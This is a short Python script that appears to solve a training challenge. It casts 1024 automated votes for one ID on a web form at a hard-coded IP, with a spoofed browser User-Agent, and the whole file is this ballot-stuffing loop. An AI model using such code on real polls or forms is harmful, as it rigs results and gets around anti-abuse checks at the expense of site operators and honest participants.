#!/usr/bin/python3


import requests
url = 'http://158.69.76.135/level2.php'
id = 1844
time = 1024
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"}

for votes in range(time):
    passValues = {'id': '1844', 'holdthedoor': 'Submit', 'key': ''}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"}

    r = requests.get(url, headers = headers)
    print(r.status_code)
    r = requests.post(url, data=passValues, headers=headers)
    print(r.status_code)
    print("done")